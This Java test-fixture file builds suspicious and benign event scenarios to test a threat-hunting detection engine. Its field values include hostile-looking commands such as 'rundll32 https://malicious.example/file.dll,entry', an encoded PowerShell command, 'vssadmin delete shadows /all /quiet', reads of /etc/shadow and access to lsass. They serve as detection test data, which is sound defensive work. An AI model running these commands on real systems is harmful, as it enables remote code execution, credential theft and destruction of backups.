package org.castrelyx.manager.hunt.v2;

import java.time.*;
import java.time.temporal.TemporalAdjusters;
import java.util.*;

/** Behaviour examples authored from the acceptance plan, not generated from query predicates. */
final class HuntScenarioFixtures {
  enum Variant {
    SUSPICIOUS,
    BENIGN,
    MISSING,
    LATE,
    REPLAY,
    ARRIVAL_REVERSED,
    OBSERVED_REVERSED,
    UNRELATED_CONTEXT
  }

  static final Set<String> ORDERED =
      Set.of("A04", "A06", "B06", "E05", "F02", "F03", "F06", "G04", "G06");

  record Event(String type, long ageSeconds, String asset, Map<String, Object> fields) {
    Event with(String name, Object value) {
      var data = new LinkedHashMap<>(fields);
      data.put(name, value);
      return new Event(type, ageSeconds, asset, data);
    }

    Event ago(long seconds) {
      return new Event(type, seconds, asset, fields);
    }

    Event on(String host) {
      return new Event(type, ageSeconds, host, fields);
    }
  }

  record Fixture(
      Instant anchor,
      List<Event> current,
      List<Event> history,
      Map<String, List<String>> lookups) {}

  static Fixture build(String id, boolean benign, Instant defaultAnchor) {
    var current = new ArrayList<Event>();
    var history = new ArrayList<Event>();
    var lookups = new LinkedHashMap<String, List<String>>();
    lookups.put("trusted_scanners", List.of("10.99.99.99"));
    lookups.put("internal_networks", List.of("10.0.0.0/8"));
    lookups.put("approved_dns", List.of("10.0.0.53"));
    lookups.put("approved_services", List.of("443"));
    lookups.put("business_hours", List.of("9-18"));
    lookups.put(
        "trusted_processes", List.of("/usr/sbin/sshd", "C:\\Program Files\\Security\\sensor.exe"));
    lookups.put("protected_paths", List.of("/protected/"));
    lookups.put("indicators", List.of("malicious.example"));
    lookups.put("indicator_domain", List.of("malicious.example"));
    Instant anchor = defaultAnchor;
    switch (id) {
      case "A01" -> {
        repeat(current, benign ? 4 : 6, auth(false));
        if (benign) repeat(current, 20, auth(true));
      }
      case "A02" -> {
        for (int i = 0; i < 20; i++)
          current.add(
              auth(false).with("actor", benign ? "alice" : "user-" + (i % 10)).ago(100 - i));
      }
      case "A03" -> {
        for (int i = 0; i < 20; i++)
          current.add(
              auth(false).with("src_ip", "10.1.1." + (1 + i % (benign ? 4 : 5))).ago(100 - i));
      }
      case "A04" -> {
        for (int i = 0; i < 5; i++) current.add(auth(false).ago(200 - i * 10));
        current.add(auth(true).ago(benign ? 500 : 10));
      }
      case "A05" -> {
        var login = auth(true).with("src_ip", "198.51.100.20");
        current.add(login);
        if (benign) history.add(login.ago(3 * 86400));
      }
      case "A06" -> {
        var login = auth(true).ago(100);
        current.add(login);
        current.add(event("auth.privilege.sudo").ago(20));
        if (benign) history.add(login.ago(3 * 86400));
      }
      case "B01" -> {
        for (int i = 0; i < 10; i++)
          current.add(net().with("dst_port", benign ? 443 : 8000 + i).ago(100 - i));
      }
      case "B02" -> {
        for (int i = 0; i < 20; i++)
          current.add(net().with("dst_ip", "10.2.0." + (1 + i % (benign ? 2 : 20))).ago(100 - i));
      }
      case "B03" -> {
        for (int i = 0; i < 20; i++)
          current.add(
              net().with("dst_ip", "10.2.0." + (i + 1)).ago(benign ? 100 - i : 3600 - i * 180));
      }
      case "B04" ->
          current.add(net().with("dst_ip", "10.2.0.30").with("dst_port", benign ? 80 : 22));
      case "B05" -> {
        for (int i = 0; i < 3; i++)
          current.add(
              event("share.access")
                  .with("src_ip", "10.1.1.1")
                  .with("share", "\\\\host\\ADMIN$")
                  .on(benign ? "host" : "host-" + i)
                  .ago(100 - i));
      }
      case "B06" -> {
        current.add(auth(true).with("session_id", "logon-1").ago(100));
        current.add(
            event("task.create").with("session_id", benign ? "logon-2" : "logon-1").ago(20));
      }
      case "C01" -> {
        for (int i = 0; i < 20; i++)
          current.add(
              dns()
                  .with("domain", benign ? "one.example" : "name-" + (i % 10) + ".example")
                  .with("dns_code", "NXDOMAIN")
                  .ago(100 - i));
      }
      case "C02" -> {
        for (int i = 0; i < 30; i++)
          current.add(
              dns()
                  .with(
                      "domain",
                      "x".repeat(50)
                          + i
                          + "."
                          + (benign ? "registered-" + i + ".com" : "tunnel.example.com"))
                  .ago(100 - i));
      }
      case "C03" -> {
        repeat(current, 40, dns().with("dns_type", "TXT"));
        for (int day = 1; day <= 14; day++)
          for (int i = 0; i < (benign ? 20 : 1); i++)
            history.add(dns().with("dns_type", "TXT").ago(day * 86400L + 3600 + i));
      }
      case "C04" -> {
        current.add(dns().with("domain", "rare.example"));
        if (benign)
          for (int i = 0; i < 3; i++)
            history.add(
                dns()
                    .with("domain", "rare.example")
                    .with("src_ip", "10.4.0." + (i + 1))
                    .ago(3 * 86400 + i));
      }
      case "C05" -> {
        for (int i = 0; i < 20; i++) {
          var answers = new ArrayList<String>();
          if (benign) {
            for (int j = 0; j < 6; j++) answers.add("198.51.100." + (1 + (j + i) % 6));
            if (i >= 6) Collections.reverse(answers);
          } else answers.add("198.51.100." + (1 + i % 10));
          current.add(
              dns()
                  .with("domain", "flux.example")
                  .with("dns_answers", answers)
                  .with("dns_ttl", 30)
                  .ago(100 - i));
        }
      }
      case "C06" ->
          repeat(current, 5, dns().with("dst_ip", benign ? "10.0.0.53" : "198.51.100.53"));
      case "D01" -> {
        long age = 2000;
        for (int i = 0; i < 25; i++) {
          age -= benign ? (i % 2 == 0 ? 10 : 150) : 30;
          current.add(net().ago(benign ? age : 900 - i * 30));
        }
      }
      case "D02" -> repeat(current, 5, net().with("dst_port", benign ? 443 : 8443));
      case "D03" ->
          repeat(
              current,
              3,
              net("suricata.http").with("http_host", benign ? "service.example" : "198.51.100.8"));
      case "D04" ->
          current.add(dns().with("domain", benign ? "benign.example" : "malicious.example"));
      case "D05" -> {
        current.add(net("zeek.ssl").with("tls_fingerprint", "ja4-test-fingerprint"));
        if (benign)
          for (int i = 0; i < 3; i++)
            history.add(
                net("zeek.ssl")
                    .with("tls_fingerprint", "ja4-test-fingerprint")
                    .with("src_ip", "10.4.0." + (i + 1))
                    .ago(3 * 86400 + i));
      }
      case "D06" ->
          repeat(
              current,
              3,
              net("zeek.ssl")
                  .with("certificate_status", "expired")
                  .with("connection_state", benign ? "S0" : "SF"));
      case "E01" -> {
        current.add(net().with("bytes_sent", 120_000_000L));
        for (int day = 1; day <= 14; day++)
          history.add(
              net()
                  .with("bytes_sent", benign ? 40_000_000L : 20_000_000L)
                  .ago(day * 86400L + 3600));
      }
      case "E02" ->
          current.add(
              net()
                  .with("bytes_sent", 60_000_000L)
                  .with("bytes_received", benign ? 30_000_000L : 1_000_000L));
      case "E03" ->
          current.add(
              net("zeek.http")
                  .with("http_method", benign ? "GET" : "POST")
                  .with("http_body_bytes", 11_000_000L));
      case "E04" -> {
        for (int i = 0; i < 20; i++)
          current.add(
              net()
                  .with("dst_ip", "198.51.100." + (i + 1))
                  .with("bytes_sent", benign ? 900_000L : 1_000_000L)
                  .ago(100 - i));
      }
      case "E05" -> {
        current.add(proc("/usr/bin/7z").ago(benign ? 10 : 100));
        current.add(net().with("bytes_sent", 12_000_000L).ago(benign ? 100 : 10));
      }
      case "E06" -> {
        // The previous week's Monday is always in retention and cannot be in the future.
        var monday =
            LocalDate.ofInstant(defaultAnchor, ZoneOffset.UTC)
                .minusWeeks(1)
                .with(TemporalAdjusters.previousOrSame(DayOfWeek.MONDAY));
        anchor = monday.atTime(benign ? 3 : 16, 0).toInstant(ZoneOffset.UTC);
        current.add(net().with("bytes_sent", 60_000_000L));
      }
      case "F01" ->
          current.add(
              proc("C:\\Windows\\powershell.exe")
                  .with(
                      "parent_name",
                      benign ? "C:\\Windows\\explorer.exe" : "C:\\Office\\WINWORD.EXE"));
      case "F02" -> {
        current.add(proc("/bin/bash").with("parent_name", "/usr/sbin/nginx").ago(100));
        current.add(
            net("process.network").with("process_id", benign ? "proc-other" : "proc-1").ago(20));
      }
      case "F03" -> {
        current.add(
            proc("powershell.exe")
                .with(
                    "command_line",
                    benign ? "powershell Get-Date" : "powershell -EncodedCommand ZQBjAGgAbwA=")
                .ago(100));
        current.add(net("process.network").with("process_id", "proc-1").ago(20));
      }
      case "F04" ->
          current.add(
              proc("rundll32.exe")
                  .with(
                      "command_line",
                      benign
                          ? "rundll32 local.dll,entry"
                          : "rundll32 https://malicious.example/file.dll,entry"));
      case "F05" -> {
        var execution = proc("/tmp/newtool").with("file_hash", "a".repeat(64));
        current.add(execution);
        if (benign) history.add(execution.ago(3 * 86400));
      }
      case "F06" -> {
        current.add(event("file.download").with("file_path", "/tmp/tool").ago(200));
        current.add(
            event("file.permission.change")
                .with("file_path", benign ? "/tmp/other" : "/tmp/tool")
                .with("command_line", "chmod +x /tmp/tool")
                .ago(100));
        current.add(proc("/tmp/tool").with("file_path", "/tmp/tool").ago(20));
      }
      case "G01" ->
          current.add(
              event("file.modify")
                  .with(
                      "file_path",
                      benign ? "/etc/app/settings.conf" : "/etc/systemd/system/strange.timer"));
      case "G02" ->
          current.add(
              event(benign ? "process.start" : "task.create")
                  .with("event_code", benign ? "4688" : "4698"));
      case "G03" ->
          current.add(
              event("registry.modify")
                  .with(
                      "registry_path",
                      benign
                          ? "HKLM\\Software\\Vendor\\Settings"
                          : "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\strange"));
      case "G04" -> {
        current.add(event("service.create").with("service", "test-service").ago(100));
        current.add(
            proc("/usr/bin/service-binary")
                .with("service", benign ? "other-service" : "test-service")
                .ago(20));
      }
      case "G05" ->
          current.add(
              event("file.modify")
                  .with(
                      "file_path",
                      benign
                          ? "/home/alice/.ssh/known_hosts"
                          : "/home/alice/.ssh/authorized_keys"));
      case "G06" -> {
        current.add(event("account.create").with("account_id", "S-1-5-21-100").ago(100));
        current.add(
            event("account.privilege.add")
                .with("account_id", benign ? "S-1-5-21-200" : "S-1-5-21-100")
                .ago(20));
      }
      case "H01" ->
          current.add(
              event("process.access")
                  .with(
                      "process_name",
                      benign ? "C:\\Program Files\\Security\\sensor.exe" : "C:\\Temp\\tool.exe")
                  .with("target_process", "C:\\Windows\\System32\\lsass.exe")
                  .with("access_mask", "0x1010"));
      case "H02" ->
          current.add(
              event("file.read")
                  .with("file_path", "/etc/shadow")
                  .with("process_name", benign ? "/usr/sbin/sshd" : "/tmp/reader"));
      case "H03" ->
          current.add(
              event(benign ? "system.event" : "audit.cleared")
                  .with("event_code", benign ? "104" : "1102")
                  .with(
                      "provider",
                      benign ? "Microsoft-Windows-TaskScheduler" : "Microsoft-Windows-Eventlog"));
      case "H04" ->
          current.add(
              event(benign ? "service.stopped" : "security.service.stopped")
                  .with("service", benign ? "ordinary-service" : "Defender")
                  .with("action", "stop"));
      case "H05" ->
          current.add(
              proc("vssadmin.exe")
                  .with(
                      "command_line",
                      benign ? "vssadmin list shadows" : "vssadmin delete shadows /all /quiet"));
      case "H06" -> {
        for (int i = 0; i < 100; i++)
          current.add(
              event(i < 20 ? "file.rename" : "file.modify")
                  .with("file_path", benign ? "/protected/active.log" : "/protected/file-" + i)
                  .with("action", i < 20 ? "rename" : "modify")
                  .ago(50 - i % 40));
      }
      default -> throw new IllegalArgumentException("No independent fixture for " + id);
    }
    // A heartbeat on each prior day proves only the documented minimum baseline visibility.
    // Behavioural history above is independent and determines newness/commonness/usual volume.
    for (int day = 1; day <= 14; day++)
      history.add(event("collector.heartbeat").ago(day * 86400L + 3600).on("baseline-host"));
    return new Fixture(anchor, List.copyOf(current), List.copyOf(history), Map.copyOf(lookups));
  }

  static HuntQuery query(Fixture fixture, String source) {
    return new HuntQuery(
        fixture.anchor().minusSeconds(7200),
        fixture.anchor().plusSeconds(1),
        new HuntQuery.Filter("eq", "source_id", List.of(source), null),
        "",
        "event_type",
        "count",
        200,
        null);
  }

  static Event event(String type) {
    return new Event(type, 60, "host", Map.of("actor", "alice", "realm", "ACME"));
  }

  static Event auth(boolean success) {
    return event(success ? "auth.login.success" : "auth.login.failure")
        .with("src_ip", "10.1.1.1")
        .with("dst_ip", "10.2.0.1")
        .with("outcome", success ? "success" : "failure");
  }

  static Event net() {
    return net("zeek.conn");
  }

  static Event net(String type) {
    return event(type)
        .with("src_ip", "10.1.1.1")
        .with("dst_ip", "198.51.100.8")
        .with("dst_port", 443)
        .with("protocol", "tcp");
  }

  static Event dns() {
    return net("zeek.dns")
        .with("domain", "query.example")
        .with("dns_type", "A")
        .with("dns_code", "NOERROR");
  }

  static Event proc(String image) {
    return event("process.start").with("process_name", image).with("process_id", "proc-1");
  }

  static void repeat(List<Event> destination, int count, Event value) {
    for (int i = 0; i < count; i++) destination.add(value.ago(100 - i));
  }

  static String payloadName(String field) {
    return switch (field) {
      case "dst_ip" -> "dest_ip";
      case "dst_port" -> "dest_port";
      case "protocol" -> "proto";
      case "domain" -> "query";
      case "dns_type" -> "qtype_name";
      case "dns_code" -> "rcode_name";
      case "dns_answers" -> "answers";
      case "dns_ttl" -> "min_ttl";
      case "certificate_status" -> "validation_status";
      case "event_code" -> "event_id";
      default -> field;
    };
  }
}
